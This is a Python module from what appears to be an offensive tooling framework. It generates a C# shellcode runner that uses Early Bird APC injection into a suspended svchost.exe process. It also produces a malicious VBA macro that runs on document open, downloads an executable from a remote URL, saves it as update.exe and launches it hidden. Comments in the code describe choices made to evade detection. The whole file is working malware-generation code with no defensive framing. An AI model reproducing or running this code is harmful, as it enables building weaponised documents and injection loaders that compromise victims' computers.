import os
import tempfile
import shutil
import subprocess
from urllib.parse import urlparse
from ..core.utils import console

RUNNER_CS_TEMPLATE = r"""
using System;
using System.Runtime.InteropServices;

public class Win32 {{
    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO {{
        public uint cb;
        public IntPtr lpReserved, lpDesktop, lpTitle;
        public uint dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
        public ushort wShowWindow, cbReserved2;
        public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
    }}

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {{
        public IntPtr hProcess, hThread;
        public uint dwProcessId, dwThreadId;
    }}

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool CreateProcessW(IntPtr lpApplicationName, IntPtr lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, IntPtr lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    public static extern uint QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);

    [DllImport("kernel32.dll")]
    public static extern uint ResumeThread(IntPtr hThread);
}}

public class Program {{
    public static void Main() {{
        byte[] sc = new byte[] {{ {shellcode} }};
        string target = "C:\\Windows\\System32\\svchost.exe";
        
        Win32.STARTUPINFO si = new Win32.STARTUPINFO();
        si.cb = (uint)Marshal.SizeOf(si);
        Win32.PROCESS_INFORMATION pi = new Win32.PROCESS_INFORMATION();

        IntPtr pTarget = Marshal.StringToHGlobalUni(target);
        bool success = Win32.CreateProcessW(IntPtr.Zero, pTarget, IntPtr.Zero, IntPtr.Zero, false, 0x00000004, IntPtr.Zero, IntPtr.Zero, ref si, out pi);
        if (success) {{
            IntPtr addr = Win32.VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);
            IntPtr written = IntPtr.Zero;
            Win32.WriteProcessMemory(pi.hProcess, addr, sc, (uint)sc.Length, out written);
            Win32.QueueUserAPC(addr, pi.hThread, IntPtr.Zero);
            Win32.ResumeThread(pi.hThread);
        }}
        Marshal.FreeHGlobal(pTarget);
    }}
}}
"""

VBA_TEMPLATE = """
Private Declare PtrSafe Function URLDownloadToFile Lib "urlmon" _
    Alias "URLDownloadToFileA" (ByVal pCaller As LongPtr, _
    ByVal szURL As String, ByVal szFileName As String, _
    ByVal dwReserved As Long, ByVal lpfnCB As LongPtr) As Long

Private Declare PtrSafe Function ShellExecute Lib "shell32.dll" _
    Alias "ShellExecuteA" (ByVal hwnd As LongPtr, _
    ByVal lpOperation As String, ByVal lpFile As String, _
    ByVal lpParameters As String, ByVal lpDirectory As String, _
    ByVal nShowCmd As Long) As LongPtr

Sub MyMacro()
    Dim res As Long
    Dim url As String
    Dim targetPath As String
    
    url = "{remote_url}"
    ' Saving to Public folder is often less restricted than %TEMP%
    targetPath = "C:\\Users\\Public\\{exe_name}"
    
    ' Use Win32 API instead of COM objects for stealth
    res = URLDownloadToFile(0, url, targetPath, 0, 0)
    
    If res = 0 Then
        ' Use ShellExecuteA instead of the heavily signatured VBA.Shell
        ShellExecute 0, "open", targetPath, "", "", 0
    End If
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
"""

def compile_runner_exe(shellcode):
    console.print(f"[bold blue][*] Compiling Early Bird EXE Runner...[/bold blue]")
    temp_dir = tempfile.mkdtemp()
    try:
        cs_file = os.path.join(temp_dir, "runner.cs")
        exe_file = os.path.join(temp_dir, "runner.exe")
        
        # Format shellcode for C#
        cs_sc = ",".join(["0x{:02x}".format(b) for b in shellcode])
        full_code = RUNNER_CS_TEMPLATE.format(shellcode=cs_sc)
        
        with open(cs_file, "w") as f:
            f.write(full_code)
            
        cmd = ["mcs", "-target:exe", "-out:" + exe_file, cs_file, "-platform:x64"]
        res = subprocess.run(cmd, capture_output=True, text=True)
        if res.returncode != 0:
            console.print("[bold red][-] Compilation failed:[/bold red]")
            console.print(res.stderr)
            import sys
            sys.exit(1)
            
        if os.path.exists(exe_file):
            with open(exe_file, "rb") as f:
                return f.read()
    finally:
        shutil.rmtree(temp_dir)

def generate(shellcode, remote_url, output_dir):
    exe_content = compile_runner_exe(shellcode)
    
    parsed_url = urlparse(remote_url)
    remote_filename = os.path.basename(parsed_url.path)
    if not remote_filename:
        remote_filename = "runner.exe"
        
    exe_path = os.path.join(output_dir, remote_filename)
    
    with open(exe_path, "wb") as f:
        f.write(exe_content)
    console.print(f"[bold green][+] Success! EXE Runner saved to: [bold white]{exe_path}[/bold white][/bold green]")
    
    victim_exe_name = "update.exe"
    vba_output = VBA_TEMPLATE.format(remote_url=remote_url, exe_name=victim_exe_name)
    vba_file = os.path.join(output_dir, "exe_downloader.vba")
    with open(vba_file, "w") as f:
        f.write(vba_output)
    console.print(f"[bold green][+] Success! VBA EXE Downloader saved to: [bold white]{vba_file}[/bold white][/bold green]")
    
    return vba_file, exe_path, remote_filename, victim_exe_name
